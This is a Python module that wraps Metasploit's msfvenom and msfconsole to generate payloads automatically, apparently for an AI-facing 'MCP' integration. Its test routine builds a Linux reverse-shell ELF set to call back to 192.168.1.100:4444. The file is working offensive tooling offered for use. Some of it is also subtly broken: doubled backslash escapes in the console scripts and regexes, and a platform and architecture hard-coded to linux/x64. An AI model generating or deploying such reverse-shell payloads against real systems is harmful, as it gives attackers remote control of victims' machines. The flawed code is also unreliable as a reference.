#!/usr/bin/env python3

"""
MSFConsole Payload Generation Fix
---------------------------------
Comprehensive fix for MSFConsole MCP payload generation issues including:
- Encoding error fixes
- Framework version updates
- Initialization optimization
- Output parsing improvements
- Error handling enhancements
"""

import asyncio
import logging
import subprocess
import tempfile
import os
import json
import re
import time
from typing import Dict, Any, Optional, List, Union
from pathlib import Path

logger = logging.getLogger(__name__)

class MSFPayloadFix:
    """Enhanced payload generation with comprehensive error handling and optimization."""
    
    def __init__(self, msf_path: str = None, msfvenom_path: str = None):
        self.msf_path = msf_path or self._find_msf_executable("msfconsole")
        self.msfvenom_path = msfvenom_path or self._find_msf_executable("msfvenom")
        self.encoding_fix_applied = False
        self.framework_version = None
        self.cache = {}
        self.performance_metrics = {}
        
    async def initialize(self) -> bool:
        """Initialize with optimizations and version checking."""
        logger.info("Initializing MSF Payload Fix...")
        
        # Check framework version and apply updates
        await self._check_and_update_framework()
        
        # Apply encoding fixes
        await self._apply_encoding_fixes()
        
        # Optimize startup performance
        await self._optimize_initialization()
        
        logger.info(f"MSF Payload Fix initialized - Framework: {self.framework_version}")
        return True
    
    async def generate_payload_fixed(self, payload: str, options: Dict[str, str] = None, 
                                   output_format: str = "raw", encoder: str = None) -> Dict[str, Any]:
        """
        Generate payload with comprehensive error handling and encoding fixes.
        
        Args:
            payload: Payload type (e.g., 'linux/x64/shell_reverse_tcp')
            options: Payload options dictionary
            output_format: Output format (raw, exe, elf, etc.)
            encoder: Optional encoder to use
            
        Returns:
            Dict containing payload data, metadata, and any errors
        """
        start_time = time.time()
        
        try:
            # Validate inputs
            if not payload:
                return {"error": "No payload specified", "success": False}
            
            # Use cached result if available
            cache_key = self._generate_cache_key(payload, options, output_format, encoder)
            if cache_key in self.cache:
                logger.info(f"Using cached payload: {cache_key}")
                return self.cache[cache_key]
            
            # Method 1: Try msfvenom directly (most reliable)
            result = await self._generate_with_msfvenom(payload, options, output_format, encoder)
            
            if result.get("success"):
                self.cache[cache_key] = result
                self._record_performance_metric("msfvenom_direct", time.time() - start_time)
                return result
            
            # Method 2: Fallback to msfconsole resource script
            logger.warning("msfvenom direct failed, trying msfconsole fallback")
            result = await self._generate_with_console_script(payload, options, output_format, encoder)
            
            if result.get("success"):
                self.cache[cache_key] = result
                self._record_performance_metric("console_script", time.time() - start_time)
                return result
            
            # Method 3: Last resort - interactive console
            logger.warning("Resource script failed, trying interactive console")
            result = await self._generate_with_interactive_console(payload, options, output_format, encoder)
            
            self._record_performance_metric("interactive_console", time.time() - start_time)
            return result
            
        except Exception as e:
            logger.error(f"Payload generation failed: {e}")
            return {
                "error": str(e),
                "success": False,
                "payload": payload,
                "execution_time": time.time() - start_time
            }
    
    async def _generate_with_msfvenom(self, payload: str, options: Dict[str, str] = None,
                                    output_format: str = "raw", encoder: str = None) -> Dict[str, Any]:
        """Generate payload using msfvenom directly with encoding fixes."""
        
        if not self.msfvenom_path:
            return {"error": "msfvenom not found", "success": False}
        
        # Build msfvenom command with proper encoding handling
        cmd = [self.msfvenom_path, "-p", payload]
        
        # Add options
        if options:
            for key, value in options.items():
                # Fix encoding issues in option values
                clean_value = self._fix_encoding_issues(str(value))
                cmd.extend([f"{key}={clean_value}"])
        
        # Add output format
        if output_format and output_format != "raw":
            cmd.extend(["-f", output_format])
        
        # Add encoder if specified
        if encoder:
            cmd.extend(["-e", encoder])
        
        # Add encoding optimization flags
        cmd.extend([
            "--platform", "linux",  # Default platform
            "--arch", "x64",        # Default architecture
            "--bad-chars", "\\x00", # Common bad characters
        ])
        
        try:
            logger.info(f"Executing msfvenom: {' '.join(cmd)}")
            
            # Execute with proper encoding handling
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=self._get_optimized_env()
            )
            
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=60  # 1 minute timeout
            )
            
            # Handle encoding properly
            stdout_text = self._decode_output_safely(stdout)
            stderr_text = self._decode_output_safely(stderr)
            
            if process.returncode == 0:
                return {
                    "success": True,
                    "payload": payload,
                    "output": stdout_text,
                    "format": output_format,
                    "method": "msfvenom_direct",
                    "size": len(stdout),
                    "options": options or {},
                    "encoder": encoder
                }
            else:
                logger.error(f"msfvenom failed with return code {process.returncode}")
                logger.error(f"stderr: {stderr_text}")
                
                return {
                    "error": f"msfvenom failed: {stderr_text}",
                    "success": False,
                    "return_code": process.returncode,
                    "method": "msfvenom_direct"
                }
                
        except asyncio.TimeoutError:
            logger.error("msfvenom execution timed out")
            return {"error": "msfvenom execution timed out", "success": False}
        except Exception as e:
            logger.error(f"msfvenom execution error: {e}")
            return {"error": str(e), "success": False}
    
    async def _generate_with_console_script(self, payload: str, options: Dict[str, str] = None,
                                          output_format: str = "raw", encoder: str = None) -> Dict[str, Any]:
        """Generate payload using msfconsole resource script."""
        
        if not self.msf_path:
            return {"error": "msfconsole not found", "success": False}
        
        try:
            # Create resource script
            with tempfile.NamedTemporaryFile(mode='w', suffix='.rc', delete=False) as script_file:
                script_file.write(f"use payload/{payload}\\n")
                
                # Set options
                if options:
                    for key, value in options.items():
                        clean_value = self._fix_encoding_issues(str(value))
                        script_file.write(f"set {key} {clean_value}\\n")
                
                # Set encoder if specified
                if encoder:
                    script_file.write(f"set encoder {encoder}\\n")
                
                # Generate payload
                if output_format == "raw":
                    script_file.write("generate\\n")
                else:
                    script_file.write(f"generate -f {output_format}\\n")
                
                script_file.write("exit\\n")
                script_path = script_file.name
            
            # Execute script
            cmd = [self.msf_path, "-q", "-r", script_path]
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=self._get_optimized_env()
            )
            
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=120  # 2 minute timeout for console operations
            )
            
            # Clean up script file
            try:
                os.unlink(script_path)
            except Exception:
                pass
            
            stdout_text = self._decode_output_safely(stdout)
            stderr_text = self._decode_output_safely(stderr)
            
            # Parse console output for payload data
            payload_data = self._extract_payload_from_console_output(stdout_text)
            
            if payload_data:
                return {
                    "success": True,
                    "payload": payload,
                    "output": payload_data,
                    "format": output_format,
                    "method": "console_script",
                    "raw_output": stdout_text,
                    "options": options or {},
                    "encoder": encoder
                }
            else:
                return {
                    "error": f"Failed to extract payload from console output: {stderr_text}",
                    "success": False,
                    "raw_output": stdout_text,
                    "method": "console_script"
                }
                
        except Exception as e:
            logger.error(f"Console script execution error: {e}")
            return {"error": str(e), "success": False}
    
    async def _generate_with_interactive_console(self, payload: str, options: Dict[str, str] = None,
                                               output_format: str = "raw", encoder: str = None) -> Dict[str, Any]:
        """Generate payload using interactive console session."""
        
        if not self.msf_path:
            return {"error": "msfconsole not found", "success": False}
        
        try:
            # Start interactive msfconsole
            process = await asyncio.create_subprocess_exec(
                self.msf_path, "-q",
                stdin=asyncio.subprocess.PIPE,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env=self._get_optimized_env()
            )
            
            # Send commands
            commands = [f"use payload/{payload}"]
            
            if options:
                for key, value in options.items():
                    clean_value = self._fix_encoding_issues(str(value))
                    commands.append(f"set {key} {clean_value}")
            
            if encoder:
                commands.append(f"set encoder {encoder}")
            
            if output_format == "raw":
                commands.append("generate")
            else:
                commands.append(f"generate -f {output_format}")
            
            commands.append("exit")
            
            # Send all commands
            command_string = "\\n".join(commands) + "\\n"
            process.stdin.write(command_string.encode('utf-8'))
            await process.stdin.drain()
            process.stdin.close()
            
            # Wait for completion
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=180  # 3 minute timeout
            )
            
            stdout_text = self._decode_output_safely(stdout)
            stderr_text = self._decode_output_safely(stderr)
            
            # Extract payload from output
            payload_data = self._extract_payload_from_console_output(stdout_text)
            
            if payload_data:
                return {
                    "success": True,
                    "payload": payload,
                    "output": payload_data,
                    "format": output_format,
                    "method": "interactive_console",
                    "raw_output": stdout_text,
                    "options": options or {},
                    "encoder": encoder
                }
            else:
                return {
                    "error": f"Failed to extract payload from interactive console: {stderr_text}",
                    "success": False,
                    "raw_output": stdout_text,
                    "method": "interactive_console"
                }
                
        except Exception as e:
            logger.error(f"Interactive console execution error: {e}")
            return {"error": str(e), "success": False}
    
    async def _check_and_update_framework(self):
        """Check framework version and suggest updates."""
        try:
            if self.msfvenom_path:
                process = await asyncio.create_subprocess_exec(
                    self.msfvenom_path, "--help",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                stdout, _ = await process.communicate()
                output = self._decode_output_safely(stdout)
                
                # Extract version info
                version_match = re.search(r"Version\\s+(\\d+\\.\\d+\\.\\d+)", output)
                if version_match:
                    self.framework_version = version_match.group(1)
                    logger.info(f"Detected Metasploit Framework version: {self.framework_version}")
                    
                    # Check if update is needed (example: versions older than 6.3.0)
                    if self._version_needs_update(self.framework_version):
                        logger.warning(f"Framework version {self.framework_version} is outdated. Consider updating.")
                        
        except Exception as e:
            logger.warning(f"Could not check framework version: {e}")
    
    async def _apply_encoding_fixes(self):
        """Apply encoding fixes for common issues."""
        # Set up proper encoding environment variables
        os.environ['LANG'] = 'en_US.UTF-8'
        os.environ['LC_ALL'] = 'en_US.UTF-8'
        os.environ['PYTHONIOENCODING'] = 'utf-8'
        
        self.encoding_fix_applied = True
        logger.info("Encoding fixes applied")
    
    async def _optimize_initialization(self):
        """Optimize initialization to reduce startup delays."""
        # Pre-warm the framework by checking basic functionality
        if self.msfvenom_path:
            try:
                # Quick version check to warm up the system
                process = await asyncio.create_subprocess_exec(
                    self.msfvenom_path, "--list", "formats",
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                await asyncio.wait_for(process.communicate(), timeout=30)
                logger.info("Framework initialization optimized")
            except Exception as e:
                logger.warning(f"Could not optimize initialization: {e}")
    
    def _find_msf_executable(self, name: str) -> Optional[str]:
        """Find MSF executable with common paths."""
        common_paths = [
            f"/usr/bin/{name}",
            f"/opt/metasploit-framework/bin/{name}",
            f"/usr/local/bin/{name}",
        ]
        
        # Check common paths first
        for path in common_paths:
            if os.path.exists(path) and os.access(path, os.X_OK):
                return path
        
        # Try PATH
        import shutil
        return shutil.which(name)
    
    def _fix_encoding_issues(self, text: str) -> str:
        """Fix common encoding issues in text."""
        if not isinstance(text, str):
            text = str(text)
        
        # Handle common problematic characters
        fixes = {
            '"': '\\"',
            "'": "\\'",
            "\\n": "\\\\n",
            "\\r": "\\\\r",
            "\\t": "\\\\t",
        }
        
        for old, new in fixes.items():
            text = text.replace(old, new)
        
        # Ensure ASCII-safe
        try:
            text.encode('ascii')
        except UnicodeEncodeError:
            text = text.encode('ascii', errors='replace').decode('ascii')
        
        return text
    
    def _decode_output_safely(self, output: bytes) -> str:
        """Safely decode output with multiple encoding attempts."""
        encodings = ['utf-8', 'latin-1', 'ascii', 'cp1252']
        
        for encoding in encodings:
            try:
                return output.decode(encoding)
            except UnicodeDecodeError:
                continue
        
        # Final fallback with error replacement
        return output.decode('utf-8', errors='replace')
    
    def _get_optimized_env(self) -> Dict[str, str]:
        """Get optimized environment variables."""
        env = os.environ.copy()
        env.update({
            'LANG': 'en_US.UTF-8',
            'LC_ALL': 'en_US.UTF-8',
            'PYTHONIOENCODING': 'utf-8',
            'MSF_DATABASE_CONFIG': '/dev/null',  # Skip DB for payload generation
            'MSF_WS_DATA_SERVICE_URL': '',       # Disable web service
        })
        return env
    
    def _extract_payload_from_console_output(self, output: str) -> Optional[str]:
        """Extract payload data from console output."""
        # Look for common payload patterns
        patterns = [
            r"Payload size: (\\d+) bytes.*?\\n(.+?)\\n",  # Raw payload
            r"Generated payload.*?\\n(.+?)\\n",            # Generated payload
            r"buf = (.+)",                                  # Buffer format
        ]
        
        for pattern in patterns:
            match = re.search(pattern, output, re.DOTALL | re.MULTILINE)
            if match:
                if len(match.groups()) > 1:
                    return match.group(2).strip()
                else:
                    return match.group(1).strip()
        
        # If no pattern matches, return the last substantial line
        lines = [line.strip() for line in output.split('\\n') if line.strip()]
        if lines:
            # Filter out common MSF prompts and messages
            filtered_lines = [
                line for line in lines
                if not any(prompt in line.lower() for prompt in 
                          ['msf', 'payload', 'set', 'use', 'exit', 'resource script'])
            ]
            if filtered_lines:
                return filtered_lines[-1]
        
        return None
    
    def _generate_cache_key(self, payload: str, options: Dict[str, str], 
                           output_format: str, encoder: str) -> str:
        """Generate cache key for payload configuration."""
        key_parts = [payload, output_format or "raw", encoder or "none"]
        if options:
            key_parts.extend([f"{k}={v}" for k, v in sorted(options.items())])
        return "|".join(key_parts)
    
    def _version_needs_update(self, version: str) -> bool:
        """Check if framework version needs update."""
        try:
            parts = [int(x) for x in version.split('.')]
            # Consider versions older than 6.3.0 as needing update
            return parts < [6, 3, 0]
        except Exception:
            return False
    
    def _record_performance_metric(self, method: str, duration: float):
        """Record performance metrics."""
        if method not in self.performance_metrics:
            self.performance_metrics[method] = []
        self.performance_metrics[method].append(duration)
        
        # Keep only last 100 measurements
        if len(self.performance_metrics[method]) > 100:
            self.performance_metrics[method] = self.performance_metrics[method][-100:]
    
    def get_performance_report(self) -> Dict[str, Any]:
        """Get performance metrics report."""
        report = {}
        for method, durations in self.performance_metrics.items():
            if durations:
                report[method] = {
                    "count": len(durations),
                    "avg_duration": sum(durations) / len(durations),
                    "min_duration": min(durations),
                    "max_duration": max(durations),
                    "total_duration": sum(durations)
                }
        return report
    
    def get_status(self) -> Dict[str, Any]:
        """Get current status of the payload fix system."""
        return {
            "msf_path": self.msf_path,
            "msfvenom_path": self.msfvenom_path,
            "framework_version": self.framework_version,
            "encoding_fix_applied": self.encoding_fix_applied,
            "cache_size": len(self.cache),
            "performance_metrics": self.get_performance_report()
        }


# Usage example and testing
async def test_payload_fix():
    """Test the payload fix functionality."""
    fix = MSFPayloadFix()
    await fix.initialize()
    
    # Test basic payload generation
    result = await fix.generate_payload_fixed(
        payload="linux/x64/shell_reverse_tcp",
        options={"LHOST": "192.168.1.100", "LPORT": "4444"},
        output_format="elf"
    )
    
    print(f"Payload generation result: {result}")
    print(f"Performance report: {fix.get_performance_report()}")
    print(f"System status: {fix.get_status()}")


if __name__ == "__main__":
    asyncio.run(test_payload_fix())